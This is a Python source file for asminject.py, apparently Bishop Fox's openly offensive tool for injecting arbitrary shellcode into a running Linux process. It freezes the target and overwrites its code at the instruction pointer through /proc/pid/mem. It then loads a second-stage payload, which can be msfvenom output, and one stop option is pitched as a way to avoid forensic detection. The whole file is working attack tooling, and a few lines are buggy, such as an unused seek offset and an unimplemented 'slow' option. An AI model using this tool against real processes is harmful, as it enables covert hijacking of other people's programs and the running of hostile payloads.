#!/usr/bin/env python3

f"Python version >= 3.6 required!"
# ^^^ fstrings are valid since python 3.6, will syntax error otherwise

BANNER = r"""
                     .__            __               __
  _____  ___/\  ____ |__| ____     |__| ____   _____/  |_  ______ ___.__.
 / _  | / ___/ /    ||  |/    \    |  |/ __ \_/ ___\   __\ \____ <   |  |
/ /_| |/___  // / / ||  |   |  \   |  \  ___/\  \___|  |   |  |_> >___  |
\_____| /___//_/_/__||__|___|  /\__|  |\___  >\___  >__| /\|   __// ____|
        \/                   \/\______|    \/     \/     \/|__|   \/

asminject.py
v0.1
Ben Lincoln, Bishop Fox, 2021-06-07
https://github.com/BishopFox/asminject
based on dlinject, which is Copyright (c) 2019 David Buchanan
dlinject source: https://github.com/DavidBuchanan314/dlinject
"""

import argparse
import inspect
import os
import re
import signal
import struct
import sys
import tempfile
import time
import subprocess

STACK_BACKUP_SIZE = 8 * 16
STAGE2_SIZE = 0x8000

def ansi_color(name):
    color_codes = {
        "blue": 34,
        "red": 91,
        "green": 32,
        "default": 39,
    }
    return f"\x1b[{color_codes[name]}m"


def log(msg, color="blue", symbol="*", ansi=True):
    if ansi:
        print(f"[{ansi_color(color)}{symbol}{ansi_color('default')}] {msg}")
    else:
        print(f"[{symbol}] {msg}")


def log_success(msg, ansi=True):
    log(msg, "green", "+", ansi)


def log_error(msg, ansi=True):
    log(msg, "red", "!", ansi)
    #raise Exception(msg)


def assemble(source, library_bases, relative_offsets, replacements = {}, ansi=True):
    formatted_source = source
    lname_placeholders = []
    lname_placeholders_matches = re.finditer(r'(\[BASEADDRESS:)(.*?)(:BASEADDRESS\])', formatted_source)
    for match in lname_placeholders_matches:
        placeholder_regex = match.group(2)
        if placeholder_regex not in lname_placeholders:
            lname_placeholders.append(placeholder_regex)
    for lname_regex in lname_placeholders:
        found_library_match = False
        for lname in library_bases.keys():
            if re.search(lname_regex, lname):
                log(f"Using '{lname}' for regex placeholder '{lname_regex}' in assembly code")
                replacements[f"[BASEADDRESS:{lname_regex}:BASEADDRESS]"] = f"0x{library_bases[lname]:016x}"
                found_library_match = True
        if not found_library_match:
            log_error(f"Could not find a match for the regular expression '{lname_regex}' in the list of libraries loaded by the target process. Make sure you've targeted the correct process, and that it is compatible with the selected payload.")
            sys.exit(1)
    for fname in relative_offsets.keys():
        replacements[f"[RELATIVEOFFSET:{fname}:RELATIVEOFFSET]"] = f"0x{relative_offsets[fname]:016x}"

    for search_text in replacements.keys():
        #if search_text not in formatted_source:
        #    log_error(f"Placeholder '{search_text}' in assembly source code was not found.")
            #sys.exit(1)
        formatted_source = formatted_source.replace(search_text, replacements[search_text])
    
    # check for any remaining placeholders in the formatted source code
    placeholder_types = ['BASEADDRESS', 'RELATIVEOFFSET', 'VARIABLE']
    missing_values = []
    for pht in placeholder_types:
        missing_placeholders_matches = re.finditer(r'(\[' + pht + ':)(.*?)(:' + pht + '\])', formatted_source)
        for match in missing_placeholders_matches:
            missing_string = match.group(0)
            if missing_string not in missing_values:
                missing_values.append(missing_string)
    
    #log(f"Formatted code:\n{formatted_source}", ansi=ansi)
    
    if len(missing_values) > 0:
        log_error(f"The following placeholders in the assembly source code code not be found: {missing_values}")
        sys.exit(1)

    (tf, out_path) = tempfile.mkstemp(suffix=".o", dir=None, text=False)
    os.close(tf)
    log(f"Writing assembled binary to {out_path}", ansi=ansi)
    #out_path = f"/tmp/assembled_{os.urandom(8).hex()}.bin"
    #cmd = "gcc -x assembler - -o {0} -nostdlib -Wl,--oformat=binary -m64 -fPIC".format()
    argv = ["gcc", "-x", "assembler", "-", "-o", out_path, "-nostdlib", "-Wl,--oformat=binary", "-m64", "-fPIC"]
    #prefix = b".intel_syntax noprefix\n.globl _start\n_start:\n"

    program = formatted_source.encode()
    pipe = subprocess.PIPE

    result = subprocess.run(argv, stdout=pipe, stderr=pipe, input=program)
    #log(f"Assembler command: {argv}", ansi=ansi)
    
    if result.returncode != 0:
        emsg = result.stderr.decode().strip()
        log_error("Assembler command failed:\n\t" + emsg.replace("\n", "\n\t"), ansi=ansi)

    result_code = None
    with open(out_path, "rb") as assembled_code:
        result_code = assembled_code.read()
    
    # try:
       # os.remove(out_path)
    # except Exception as e:
       # log_error(f"Couldn't delete termporary binary file '{out_path}': {e}")
    return result_code

def get_library_base_addresses(pid):
    result = {}
    with open(f"/proc/{pid}/maps") as maps_file:
        for line in maps_file.readlines():
            ld_path = line.split()[-1]
            ld_base = int(line.split("-")[0], 16)
            if ld_path not in result.keys():
                result[ld_path] = ld_base
    return result

def get_temp_file_name():
    (tf, result) = tempfile.mkstemp(suffix=None, dir=None, text=False)
    os.close(tf)
    return result

def asminject(base_script_path, pid, asm_path, offsets_path, architecture, stage_mode, stopmethod="sigstop", stage_2_write_location="", stage_2_read_location="", ansi=True, pause=False, precompiled=False, custom_replacements = {}):
    if stopmethod == "sigstop":
        log("Sending SIGSTOP", ansi=ansi)
        os.kill(pid, signal.SIGSTOP)
        while True:
            with open(f"/proc/{pid}/stat") as stat_file:
                state = stat_file.read().split(" ")[2]
            if state in ["T", "t"]:
                break
            log("Waiting for process to stop...", ansi=ansi)
            time.sleep(0.1)
    elif stopmethod == "cgroup_freeze":
        log("Freezing process...", ansi=ansi)
        freeze_dir = "/sys/fs/cgroup/freezer/dlinject_" + os.urandom(8).hex()
        os.mkdir(freeze_dir)
        with open(freeze_dir + "/tasks", "w") as task_file:
            task_file.write(str(pid))
        with open(freeze_dir + "/freezer.state", "w") as state_file:
            state_file.write("FROZEN\n")
        while True:
            with open(freeze_dir + "/freezer.state") as state_file:
                if state_file.read().strip() == "FROZEN":
                    break
            log("Waiting for process to freeze...", ansi=ansi)
            time.sleep(0.1)
        log("Process is frozen", ansi=ansi)
    else:
        log.warn("We're not going to stop the process first!", ansi=ansi)

    with open(f"/proc/{pid}/syscall") as syscall_file:
        syscall_vals = syscall_file.read().split(" ")
    rip = int(syscall_vals[-1][2:], 16)
    rsp = int(syscall_vals[-2][2:], 16)

    log(f"RIP: {hex(rip)}", ansi=ansi)
    log(f"RSP: {hex(rsp)}", ansi=ansi)

    library_bases = get_library_base_addresses(pid)
    library_names = []
    for lname in library_bases.keys():
        library_names.append(lname)
    library_names.sort()
    for lname in library_names:
        log(f"{lname}: 0x{library_bases[lname]:016x}", ansi=ansi)
    
    # readelf -a --wide /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep DEFAULT | grep FUNC | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | cut -d" " -f3,9 
    relative_offsets = {}
    if offsets_path != "":
        with open(offsets_path) as offsets_file:
            for line in offsets_file.readlines():
                line_array = line.strip().split(" ")
                relative_offsets[line_array[1].strip()] = int(line_array[0], 16)

    #stage2_path = f"/tmp/stage2_{os.urandom(8).hex()}.bin"
    stage2_write_path = ""
    if stage_2_write_location == "":
        stage2_write_path = get_temp_file_name()
    else:
        stage2_write_path = stage_2_write_location
    
    stage2_read_path = ""
    if stage_2_read_location == "":
        stage2_read_path = stage2_write_path
    else:
        stage2_read_path = stage_2_read_location

    stage1 = None
    
    stage1_source_filename = "stage1-file.s"
    if stage_mode == "mem":
        stage1_source_filename = "stage1-memory.s"
    stage1_path = os.path.join(base_script_path, "asm", architecture, stage1_source_filename)
    if not os.path.isfile(stage1_path):
        log_error(f"Could not find the stage 1 source code '{stage1_path}'", ansi=ansi)
        sys.exit(1)
    
    stage1_replacements = {}
    stage1_replacements['[VARIABLE:STAGE2_SIZE:VARIABLE]'] = f"{STAGE2_SIZE}"
    stage1_replacements['[VARIABLE:STAGE2_PATH:VARIABLE]'] = stage2_read_path
    with open(stage1_path, "r") as stage1_code:
        stage1 = assemble(stage1_code.read(), library_bases, relative_offsets, replacements=stage1_replacements, ansi=ansi)

    with open(f"/proc/{pid}/mem", "wb+") as mem:
        # back up the code we're about to overwrite
        mem.seek(rip)
        code_backup = mem.read(len(stage1))

        # back up the part of the stack that the shellcode will clobber
        mem.seek(rsp - STACK_BACKUP_SIZE)
        stack_backup = mem.read(STACK_BACKUP_SIZE)

        # write the primary shellcode
        mem.seek(rip)
        mem.write(stage1)

    log("Wrote first stage shellcode", ansi=ansi)

    if not os.path.isfile(asm_path):
        log_error(f"Could not find the stage 2 file '{asm_path}'", ansi=ansi)
        sys.exit(1)

    stage2 = None
        
    if precompiled:
        with open(asm_path, "rb") as asm_code:
            stage2 = asm_code.read()
    else:
        stage2_replacements = custom_replacements
        stage2_replacements['[VARIABLE:RIP:VARIABLE]'] = f"{rip}"
        stage2_replacements['[VARIABLE:RSP:VARIABLE]'] = f"{rsp}"
        stage2_replacements['[VARIABLE:LEN_CODE_BACKUP:VARIABLE]'] = f"{len(code_backup)}"
        stage2_replacements['[VARIABLE:STACK_BACKUP_SIZE:VARIABLE]'] = f"{STACK_BACKUP_SIZE}"
        stage2_replacements['[VARIABLE:CODE_BACKUP_JOIN:VARIABLE]'] = ",".join(map(str, code_backup))
        stage2_replacements['[VARIABLE:STACK_BACKUP_JOIN:VARIABLE]'] = ",".join(map(str, stack_backup))
        stage2_replacements['[VARIABLE:RSP_MINUS_STACK_BACKUP_SIZE:VARIABLE]'] = f"{(rsp-STACK_BACKUP_SIZE)}"
        with open(asm_path, "r") as asm_code:
            stage2 = assemble(asm_code.read(), library_bases, relative_offsets, replacements=stage2_replacements)
    
    if stage_mode == "mem":
        done_waiting = False
        with open(f"/proc/{pid}/mem", "wb+") as mem:
            while not done_waiting:
                # check to see if stage 1 has given the OK to proceed
                mem.seek(rip)
                rip_value = struct.unpack('Q', mem.read(8))[0]
                mem.seek(rip) + 8
                mmap_block = struct.unpack('Q', mem.read(8))[0]
                log(f"RIP is 0x{rip_value:016x}")
                log(f"MMAP'd block is is 0x{mmap_block:016x}")
                
                if rip_value == 0:
                    # write stage 2
                    mem.seek(mmap_block)
                    mem.write(stage2)
                    
                    # Give stage 1 the OK to proceed
                    mem.seek(rip)
                    ok_val = struct.pack('I', 1)
                    mem.write(ok_val)
                    done_waiting = True
                
                else:
                    log("Waiting for stage 1 to allocate memory")
                    time.sleep(1.0)

    else:
        with open(stage2_write_path, "wb") as stage2_file:
            os.chmod(stage2_write_path, 0o666)
            stage2_file.write(stage2)
        log(f"Wrote stage 2 to {repr(stage2_write_path)}", ansi=ansi)

        if pause:
            log(f"If the target process is operating with a different filesystem root, copy the stage 2 binary to {repr(stage2_read_path)} in the target container before proceeding", ansi=ansi)
            input("Press Enter to continue...")

    if stopmethod == "sigstop":
        log("Continuing process...", ansi=ansi)
        os.kill(pid, signal.SIGCONT)
    elif stopmethod == "cgroup_freeze":
        log("Thawing process...", ansi=ansi)
        with open(freeze_dir + "/freezer.state", "w") as state_file:
            state_file.write("THAWED\n")

        # put the task back in the root cgroup
        with open("/sys/fs/cgroup/freezer/tasks", "w") as task_file:
            task_file.write(str(pid))

        # cleanup
        os.rmdir(freeze_dir)

    log_success("Done!", ansi=ansi)


# begin: https://stackoverflow.com/questions/15008758/parsing-boolean-values-with-argparse
def str2bool(v):
    if isinstance(v, bool):
        return v
    if v.lower() in ('yes', 'true', 't', 'y', '1'):
        return True
    elif v.lower() in ('no', 'false', 'f', 'n', '0'):
        return False
    else:
        raise argparse.ArgumentTypeError('Boolean value expected.')

# end: https://stackoverflow.com/questions/15008758/parsing-boolean-values-with-argparse

if __name__ == "__main__":
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="Inject arbitrary assembly code into a live process")

    parser.add_argument("pid", metavar="process_id", type=int,
        help="The pid of the target process")

    parser.add_argument("asm_path", metavar="payload_path", type=str,
        help="Path to the assembly code that should be injected")

    parser.add_argument("--relative-offsets", type=str, default="", required=False,
        help="Path to the list of relative offsets referenced in the assembly code. Generate on a per-binary basis using the following command, e.g. for libc-2.31: # readelf -a --wide /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep DEFAULT | grep FUNC | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | cut -d\" \" -f3,9")

    parser.add_argument("--stop-method",
        choices=["sigstop", "cgroup_freeze", "slow", "none"],
        help="How to stop the target process prior to shellcode injection. \
              'sigstop' (default) uses the built-in Linux process suspension mechanism, and can have side-effects. \
              'cgroup_freeze' requires root, and only operates in environments with cgroups.\
              'slow' attempts to avoid forensic detection and side-effects of suspending a process by \
              temporarily setting the priority of the target process to the lowest possible value, \
              and the priority of asminject.py to the highest possible value. \
              'none' leaves the target process running as-is and is likely to cause race conditions.")
    
    parser.add_argument("--arch",
        choices=["x86-32", "x86-64", "arm32", "arm64"], default="x86-64",
        help="Processor architecture for the injected code. \
              Default: x86-64.")
    
    parser.add_argument("--stage-mode",
        choices=["mem", "file"], default="file",
        help="Technique for loading the stage 2 code. \
              mem: coordinated load between Python script and stage 1 shellcode, no reference to file on disk. \
              file: stage 2 is written to a file and then mmapped into the target process by stage 1 (dlinject.py approach)\
              Default: file.")
    
    parser.add_argument("--stage2-write-path", type=str, default="",
        help="When using the file-based second stage, the path where the script should write the stage 2 binary (default: randomly generated)")
    
    parser.add_argument("--stage2-read-path", type=str, default="",
        help="When using the file-based second stage, the path where the stage 1 code should read the stage 2 code from (default: same as where the script wrote the binary)")
        
    parser.add_argument("--var",action='append',nargs=2, type=str,
        help="Specify a custom variable for use by the stage 2 code, e.g. --var pythoncode \"print('OK')\". May be specified multiple times for different variables.")
    
    parser.add_argument("--plaintext", type=str2bool, nargs='?',
        const=True, default=False,
        help="Disable ANSI formatting for console output")
    
    parser.add_argument("--pause", type=str2bool, nargs='?',
        const=True, default=True,
        help="Prompt for input before resuming/unfreezing the target process")
    
    parser.add_argument("--precompiled", type=str2bool, nargs='?',
        const=True, default=False,
        help="Treat the stage 2 payload as a binary that has already been compiled (e.g. msfvenom output) and do not attempt to compile it from source code")

    args = parser.parse_args()

    custom_replacements = {}
    
    if args.var:
        for var_set in args.var:
            custom_replacements[f"[VARIABLE:{var_set[0]}:VARIABLE]"] = var_set[1]

    asm_abs_path = os.path.abspath(args.asm_path)
    
    reloff_abs_path = ""
    if args.relative_offsets == "":
        if not args.precompiled:
            log_error("A list of relative offsets was not specified. If the injection fails, check your payload to make sure you're including the offsets of any exported functions it calls.", ansi=args.plaintext)
    else:
        reloff_abs_path = os.path.abspath(args.relative_offsets)
    
    base_script_path = os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))

    asminject(base_script_path, args.pid, asm_abs_path, reloff_abs_path, args.arch, args.stage_mode, args.stop_method or "sigstop", stage_2_write_location=args.stage2_write_path, ansi=args.plaintext, pause=args.pause, precompiled=args.precompiled, custom_replacements=custom_replacements)
